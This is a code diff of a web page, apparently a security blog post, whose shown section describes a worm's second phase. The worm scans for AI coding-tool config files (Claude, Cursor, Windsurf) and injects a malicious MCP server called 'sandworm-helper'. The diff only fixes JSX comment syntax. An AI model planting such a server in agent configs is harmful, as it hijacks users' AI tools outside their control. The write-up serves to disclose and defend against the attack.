@@ -62,12 +62,12 @@ export default function Post() {
           <h3 className="text-xl font-semibold text-white mt-8">Phase 2: MCP Config Injection (T+0)</h3>
           <p>The worm scans for AI tool config files and injects a malicious MCP server:</p>
           <div className="bg-[#1a1a2e] rounded-lg p-4 font-mono text-sm border border-white/10 overflow-x-auto">
-            <p className="text-gray-500">// Targets:</p>
-            <p className="text-gray-500">// ~/.claude/config.json</p>
-            <p className="text-gray-500">// ~/.cursor/mcp.json</p>
-            <p className="text-gray-500">// ~/.windsurf/mcp.json</p>
+            <p className="text-gray-500">{"// Targets:"}</p>
+            <p className="text-gray-500">{"// ~/.claude/config.json"}</p>
+            <p className="text-gray-500">{"// ~/.cursor/mcp.json"}</p>
+            <p className="text-gray-500">{"// ~/.windsurf/mcp.json"}</p>
             <p>&nbsp;</p>
-            <p className="text-gray-500">// Injected config:</p>
+            <p className="text-gray-500">{"// Injected config:"}</p>
             <p>{`{`}</p>
             <p>&nbsp;&nbsp;&quot;mcpServers&quot;: {`{`}</p>
             <p>&nbsp;&nbsp;&nbsp;&nbsp;<span className="text-red-400">&quot;sandworm-helper&quot;</span>: {`{`}</p>
